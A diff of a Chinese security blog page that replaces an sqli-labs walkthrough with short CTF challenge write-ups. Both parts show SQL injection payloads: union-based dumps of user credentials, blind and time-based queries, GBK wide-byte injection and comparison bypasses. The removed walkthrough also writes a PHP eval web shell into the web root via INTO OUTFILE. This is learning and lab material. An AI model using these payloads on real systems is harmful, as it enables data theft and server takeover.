@@ -66,7 +66,7 @@
 
 
 
-  <meta name="keywords" content="mysql," />
+  <meta name="keywords" content="ctf," />
 
 
 
@@ -77,62 +77,18 @@
 
 
 
-<meta name="description" content="1-10/解题思路Less-1 GET-Error based-Single quotes-String首先是正常的查询界面">
-<meta name="keywords" content="mysql">
+<meta name="description" content="南邮ctf之旅(无图)签到题查看页面源代码就ok了">
+<meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs解题思路">
-<meta property="og:url" content="http://www.mr-guo.xin/2018/07/06/sql-labs/index.html">
+<meta property="og:title" content="NYCtf">
+<meta property="og:url" content="http://www.mr-guo.xin/2018/09/26/NYCtf/index.html">
 <meta property="og:site_name" content="super&#x2F;guo">
-<meta property="og:description" content="1-10/解题思路Less-1 GET-Error based-Single quotes-String首先是正常的查询界面">
+<meta property="og:description" content="南邮ctf之旅(无图)签到题查看页面源代码就ok了">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-09-32-16.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-09-34-04.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-09-38-36.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-09-47-59.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-09-50-46.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-09-56-37.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-10-10-18.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-10-15-50.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-10-17-55.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-02/2018-07-06-14-54-41.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-02/2018-07-06-11-01-55.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-02/2018-07-06-11-02-52.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-02/2018-07-06-11-04-06.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-02/2018-07-06-11-05-13.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-02/2018-07-06-11-06-42.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-03/2018-07-06-11-10-29.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-03/2018-07-06-11-12-19.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-03/2018-07-06-11-13-01.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-03/2018-07-06-11-15-22.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-03/2018-07-06-11-16-44.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-03/2018-07-06-11-18-00.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-04/2018-07-06-11-33-02.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-04/2018-07-06-11-33-56.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-04/2018-07-06-11-34-34.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-04/2018-07-06-13-33-02.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-04/2018-07-06-13-33-39.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-04/2018-07-06-13-34-28.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-05/2018-07-06-16-08-06.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-05/2018-07-06-15-55-27.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-05/2018-07-06-16-13-56.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-05/2018-07-06-16-17-51.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-05/2018-07-06-16-19-45.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-05/2018-07-06-16-20-51.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-07/2018-07-08-08-54-23.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-07/2018-07-08-10-01-33.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-07/2018-07-08-10-23-07.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-07/2018-07-08-10-37-59.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-07/2018-07-08-10-34-21.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-07/2018-07-08-10-36-55.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-07/2018-07-08-10-41-20.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-08/2018-07-06-16-40-06.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-08/2018-07-06-16-40-22.png">
-<meta property="og:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-08/2018-07-06-16-41-44.png">
-<meta property="og:updated_time" content="2018-09-18T10:34:43.330Z">
+<meta property="og:updated_time" content="2018-09-27T11:48:34.654Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs解题思路">
-<meta name="twitter:description" content="1-10/解题思路Less-1 GET-Error based-Single quotes-String首先是正常的查询界面">
-<meta name="twitter:image" content="http://www.mr-guo.xin/2018/07/06/sql-labs/sql-01/2018-07-06-09-32-16.png">
+<meta name="twitter:title" content="NYCtf">
+<meta name="twitter:description" content="南邮ctf之旅(无图)签到题查看页面源代码就ok了">
 
 
 
@@ -162,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://www.mr-guo.xin/2018/07/06/sql-labs/"/>
+  <link rel="canonical" href="http://www.mr-guo.xin/2018/09/26/NYCtf/"/>
 
 
 
 
 
-  <title>sqli-labs解题思路 | super/guo</title>
+  <title>NYCtf | super/guo</title>
   
 
 
@@ -339,7 +295,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.mr-guo.xin/2018/07/06/sql-labs/">
+    <link itemprop="mainEntityOfPage" href="http://www.mr-guo.xin/2018/09/26/NYCtf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="super/guo">
@@ -356,7 +312,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs解题思路</h1>
+          <h1 class="post-title" itemprop="name headline">NYCtf</h1>
         
 
         <div class="post-meta">
@@ -368,8 +324,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-06T09:11:36+08:00">
-                2018-07-06
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-26T10:29:37+08:00">
+                2018-09-26
               </time>
             
 
@@ -393,17 +349,6 @@
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/Web-Security/" itemprop="url" rel="index">
                     <span itemprop="name">Web-Security</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web-Security/sqli-labs/" itemprop="url" rel="index">
-                    <span itemprop="name">sqli-labs</span>
                   </a>
                 </span>
 
@@ -433,7 +378,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,600
+                  1,135
                 </span>
               
 
@@ -449,7 +394,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  7
+                  5
                 </span>
               
             </div>
@@ -470,124 +415,41 @@
       
 
       
-        <h2 id="1-10-解题思路"><a href="#1-10-解题思路" class="headerlink" title="1-10/解题思路"></a>1-10/解题思路</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1 GET-Error based-Single quotes-String"></a>Less-1 GET-Error based-Single quotes-String</h3><pre><code>首先是正常的查询界面
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-32-16.png" alt=""></p>
-<!-- 发现返回不同用户信息，可以判断为字符型注入
-![](sql-labs/sql-01/2018-07-06-10-54-07.png) -->
+        <h2 id="南邮ctf之旅-无图"><a href="#南邮ctf之旅-无图" class="headerlink" title="南邮ctf之旅(无图)"></a>南邮ctf之旅(无图)</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>查看页面源代码就ok了</p>
 <a id="more"></a>
-<pre><code>输入单引号可以看到报错信息，根据报错信息可以知道输入的id被单引号包裹，接下来猜字段。
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-34-04.png" alt=""></p>
-<pre><code>order by后的数字大于3的时候页面会返回报错信息，也就是表里有3个字段。
-这里的 %23 是 # 的url编码，用于注释。
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-38-36.png" alt=""></p>
-<pre><code>接下来构造联合查询语句，这里页面没有变化的原因是后台只显示返回的查询结果的第一条记录。
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-47-59.png" alt=""></p>
-<pre><code>可以让联合查询的左边查询结果为空，那么就会显示右边的查询结果
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-50-46.png" alt=""></p>
-<pre><code>接下来就可以利用各种数据库函数查看数据库信息。
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-09-56-37.png" alt=""></p>
-<pre><code>接下来爆表名，构造下面的语句,这里后台会限制查询结果的显示个数，所以利用了 group_concat() 函数
-?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-10-10-18.png" alt=""></p>
-<pre><code>接下来就继续爆列名，这里以 users 表为例，构造下列语句。
-?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; %23
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-10-15-50.png" alt=""></p>
-<pre><code>然后构造下面的语句可以查询到所有用户的信息
-?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users %23
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-01/2018-07-06-10-17-55.png" alt=""></p>
-<h3 id="Less-2-GET-Error-based-Intiger-based"><a href="#Less-2-GET-Error-based-Intiger-based" class="headerlink" title="Less-2 GET-Error based-Intiger based"></a>Less-2 GET-Error based-Intiger based</h3><pre><code>输入单引号可以看到报错信息，可以判断为数字型注入
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-14-54-41.png" alt=""><br><!-- ![](sql-labs/sql-02/2018-07-06-10-59-19.png) --></p>
-<pre><code>判断字段数为3
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-01-55.png" alt=""></p>
-<pre><code>联合查询
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-02-52.png" alt=""></p>
-<pre><code>爆表名
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-04-06.png" alt=""></p>
-<pre><code>爆列名
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-05-13.png" alt=""></p>
-<pre><code>爆出所有用户信息
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-02/2018-07-06-11-06-42.png" alt=""></p>
-<h3 id="Less-3-GET-Error-based-Single-with-twist-String"><a href="#Less-3-GET-Error-based-Single-with-twist-String" class="headerlink" title="Less-3 GET-Error based-Single with twist-String"></a>Less-3 GET-Error based-Single with twist-String</h3><!-- 依次查询 id=1 以及 id=2-1,页面返回不同用户信息，可以判断为字符型注入
-![](sql-labs/sql-03/2018-07-06-11-09-00.png) -->
-<pre><code>添加单引号页面返回报错信息，可以知道 id 被 (&apos;&apos;) 包裹
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-10-29.png" alt=""></p>
-<pre><code>判断字段数为3
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-12-19.png" alt=""></p>
-<pre><code>联合查询
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-13-01.png" alt=""></p>
-<pre><code>爆表名
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-15-22.png" alt=""></p>
-<pre><code>爆列名
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-16-44.png" alt=""></p>
-<pre><code>爆出所有用户信息
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-03/2018-07-06-11-18-00.png" alt=""></p>
-<h3 id="Less-4-GET-Error-based-Double-quotes-String"><a href="#Less-4-GET-Error-based-Double-quotes-String" class="headerlink" title="Less-4 GET-Error based-Double quotes-String"></a>Less-4 GET-Error based-Double quotes-String</h3><!-- 依次查询 id=1 以及 id=2-1,页面返回不同用户信息，可以判断为字符型注入
-![](sql-labs/sql-04/2018-07-06-11-20-40.png) -->
-<pre><code>添加双引号页面返回报错信息，id 被 (&quot;&quot;) 包裹
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-11-33-02.png" alt=""></p>
-<pre><code>判断字段数为3
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-11-33-56.png" alt=""></p>
-<pre><code>联合查询
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-11-34-34.png" alt=""></p>
-<pre><code>爆表名
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-13-33-02.png" alt=""></p>
-<pre><code>爆列名
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-13-33-39.png" alt=""></p>
-<pre><code>爆出所有用户信息
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-04/2018-07-06-13-34-28.png" alt=""></p>
-<h3 id="Less-5-GET-Double-injection-Single-quotes-String"><a href="#Less-5-GET-Double-injection-Single-quotes-String" class="headerlink" title="Less-5 GET-Double injection-Single quotes-String"></a>Less-5 GET-Double injection-Single quotes-String</h3><pre><code>道题我的思路是盲注，之后参考了一下别人的writeup知道是双查询注入，题目也是提示，然后了解了一下双查询注入是有固定的语句：
-?id=1&apos; union select count(*),2,concat((select database()),floor(rand()*2))a from information_schema.tables group by a %23
-database()可以替换成需要查询的数据
-
-标题有提示是单引号，然后判断字段数为3
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-08-06.png" alt=""></p>
-<pre><code>然后使用双查询注入，这里报错显示的security0去掉后面的0就是当前使用的数据库名
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-15-55-27.png" alt=""></p>
-<pre><code>接着爆表名，这里直接查询表名会出现以下报错信息，需要用limit限定范围
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-13-56.png" alt=""><br><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-17-51.png" alt=""></p>
-<pre><code>接着爆列名，同上。
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-19-45.png" alt=""></p>
-<pre><code>爆数据
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-05/2018-07-06-16-20-51.png" alt=""></p>
-<h3 id="Less-6-GET-Double-injection-Double-quotes-String"><a href="#Less-6-GET-Double-injection-Double-quotes-String" class="headerlink" title="Less-6 GET-Double injection-Double quotes-String"></a>Less-6 GET-Double injection-Double quotes-String</h3><pre><code>和上一题的步骤一样，但是要把单引号替换为双引号。
-</code></pre><h3 id="Less-7-GET-Dump-into-outfile-String"><a href="#Less-7-GET-Dump-into-outfile-String" class="headerlink" title="Less-7 GET-Dump into outfile-String"></a>Less-7 GET-Dump into outfile-String</h3><pre><code>这题看了一下源码和别人的思路。
-先在之前的关卡获取到数据库的路径：@@basedir获取mysql的安装路径，@@datadir获取mysql的数据路径
-网站的根目录就是 &apos;C:/phpStudy/PHPTutorial/WWW/&apos;
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-08-54-23.png" alt=""></p>
-<pre><code>这里执行后会发现文件并没有写入目录，查了一下资料是因为缺少权限：
-mysql有一个称为secure_file_priv的全局系统变量,5.5.53之前的版本都默认为空，之后都为null，null为禁用数据的导入导出，空为变量无效。
-</code></pre><!-- ![](sql-labs/sql-07/2018-07-08-09-19-53.png) -->
-<pre><code>查看secure_file_priv全局系统变量
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-01-33.png" alt=""></p>
-<pre><code>为了测试把修改本地的my.ini文件并重启服务
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-23-07.png" alt=""></p>
-<pre><code>构造如下语句：
-?id=1&apos;)) union select 1,database(),user() into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/test.txt&apos;  %23
-执行后页面会如图显示
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-37-59.png" alt=""></p>
-<pre><code>但是查看www目录，可以看到生成了test.txt文件
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-34-21.png" alt=""></p>
-<pre><code>构造下面的语句导出users表数据
-?id=1&apos;)) union select 1,group_concat(username),group_concat(password) from users into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/test2.txt&apos;  %23
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-36-55.png" alt=""></p>
-<pre><code>然后可以写入一句话木马
-?id=1&apos;)) union select 1,2,&apos;&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;&apos; into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&apos;  %23
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-07/2018-07-08-10-41-20.png" alt=""></p>
-<h3 id="Less-8-GET-Blind-Boolian-based-Single-quotes"><a href="#Less-8-GET-Blind-Boolian-based-Single-quotes" class="headerlink" title="Less-8 GET-Blind-Boolian based-Single quotes"></a>Less-8 GET-Blind-Boolian based-Single quotes</h3><pre><code>这题是布尔盲注，查询为空时页面会不同
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-08/2018-07-06-16-40-06.png" alt=""><br><img src="/2018/07/06/sql-labs/sql-08/2018-07-06-16-40-22.png" alt=""></p>
-<pre><code>猜测字段为3
-</code></pre><p><img src="/2018/07/06/sql-labs/sql-08/2018-07-06-16-41-44.png" alt=""></p>
-<!-- 猜测第一张表名的长度为6
-![](sql-labs/sql-08/2018-07-06-16-50-04.png)
-![](sql-labs/sql-08/2018-07-06-16-50-29.png) -->
-<pre><code>用二分法爆表名
-</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1<span class="string">' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and length((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1))&gt;6 %23 </span><br><span class="line">返回异常页面，第一张表名的长度为6</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and ascii(mid((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1,1))&gt;101 %23 </span><br><span class="line">返回异常页面，第一位是 e</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and ascii(mid((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),2,1))&gt;108 %23 </span><br><span class="line">返回异常页面，第二位是 m</span><br><span class="line"></span><br><span class="line">剩余4位同上。</span><br></pre></td></tr></table></figure>
-<pre><code>爆users表字段
-</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1<span class="string">' and length((select column_name from information_schema.columns where table_name='</span>users<span class="string">' limit 1,1))&gt;7 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and length((select column_name from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'users'</span> <span class="built_in">limit</span> 1,1))&gt;8 %23 </span><br><span class="line">返回异常页面，users表第二个字段名长度为8</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and ascii(mid((select column_name from information_schema.columns where table_name='</span>users<span class="string">' limit 1,1),1,1))&gt;116 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and ascii(mid((select column_name from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'users'</span> <span class="built_in">limit</span> 1,1),1,1))&gt;117 %23 </span><br><span class="line">返回异常页面，第一位是 u</span><br><span class="line">剩余位数同上。</span><br><span class="line">之后就可以爆数据了。原理同上。</span><br></pre></td></tr></table></figure>
-<h3 id="Less-9-GET-Blind-Time-based-Single-quotes"><a href="#Less-9-GET-Blind-Time-based-Single-quotes" class="headerlink" title="Less-9 GET-Blind-Time based-Single quotes"></a>Less-9 GET-Blind-Time based-Single quotes</h3><pre><code>这题是时间盲注，无论输入什么参数页面都不会变化。
-</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆第一张表</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6,1,sleep(4)) %23</span></span><br><span class="line"><span class="string">页面延迟较长时间返回</span></span><br><span class="line"><span class="string">?id=1'</span> and <span class="keyword">if</span>(length((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1))&gt;5,1,sleep(4)) %23</span><br><span class="line">页面在正常时间内返回，判断表名长度为6</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101,1,sleep(4)) %23</span></span><br><span class="line"><span class="string">页面延迟返回</span></span><br><span class="line"><span class="string">?id=1'</span> and <span class="keyword">if</span>(ascii(mid((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1,1))&gt;100,1,sleep(4)) %23</span><br><span class="line">页面正常返回，第一位的ascii码为101，也就是 e</span><br><span class="line"></span><br><span class="line">剩余位数同上。</span><br></pre></td></tr></table></figure>
-<h3 id="Less-10-GET-Blind-Time-based-Double-quotes"><a href="#Less-10-GET-Blind-Time-based-Double-quotes" class="headerlink" title="Less-10 GET-Blind-Time based-Double quotes"></a>Less-10 GET-Blind-Time based-Double quotes</h3><pre><code>和上一题的步骤一样，但是要把单引号替换为双引号。
-</code></pre><h2 id="11-20-解题思路"><a href="#11-20-解题思路" class="headerlink" title="11-20/解题思路"></a>11-20/解题思路</h2><p>###11关</p>
+<h3 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h3><p>看题目知道是md5碰撞，只需要找到另一串md5加密后为0x开头的字符</p>
+<h3 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h3><p>输入发现有字符长度限制，F12打开调试界面修改input的maxlength</p>
+<h3 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h3><p>绕了一圈什么也没发现，数据包也没发现异常，猜测图片做了手脚，保存到本地用winhex查看，发现末尾出现flag</p>
+<h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>页面上显示的时js颜文字，直接复制到F12后出现控制台回车得到flag，如果页面显示乱码，先调整浏览器的编码为unicode</p>
+<h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><p>抓包得到flag</p>
+<h3 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h3><p>这题在网上搜了一些资料，方法就是把eval修改为echo就能输出flag</p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>点击链接发现参数file<br>用php伪协议读取index.php文件<br>发现一串base64加密后的字符串<br>解密后发现flag</p>
+<h3 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h3><p>依旧通过抓包发现flag</p>
+<h3 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h3><p>抓包发现cookie中有login参数值为0，TIP: 0==not，修改为1返回flag</p>
+<h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>根据页面提示查看robots.txt文件，发现php代码片段，根据提示在sql.php页面提交id参数，判断需要提交的id值为1024，这里利用了intval()方法的一个特性，intval()方法处理浮点数时会忽略后面的小数部分，这样在查询数据库时id为1024，而进行比较时为1024和1024.xxx作比较达到绕过的目的</p>
+<h3 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h3><p>题目提示为宽字节注入</p>
+<p>payload：<br>  <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27</a> order by 2 %23  确定有两列<br>  <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27</a> union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 发现有多张表<br>  <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27</a> union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23  逐个表查询列名，这里有一点需要注意的是，表名处无法绕过引号转译，就替换为16进制依然能达到绕过<br>  <a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df%27</a> union select 1,flag from ctf4 %23  最后查询到flag</p>
+<h3 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h3><p>题目提示有多种解法，首先想到的是利用数组进行绕过</p>
+<p>payload： <a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=123" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=123</a></p>
+<p>另一种方法是通过ereg函数的漏洞：%00截断</p>
+<p>payload： <a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=123%00%23biubiubiu" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=123%00%23biubiubiu</a></p>
+<p>可能存在别的方法目前还没了解到</p>
+<h3 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h3><p>md5加密后为0x的开头的字符串会被认为是相同的，可以构造如下payload</p>
+<p><a href="http://chinalover.sinaapp.com/web17/index.php?a=240610708&amp;b=QNKCDZO" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php?a=240610708&amp;b=QNKCDZO</a></p>
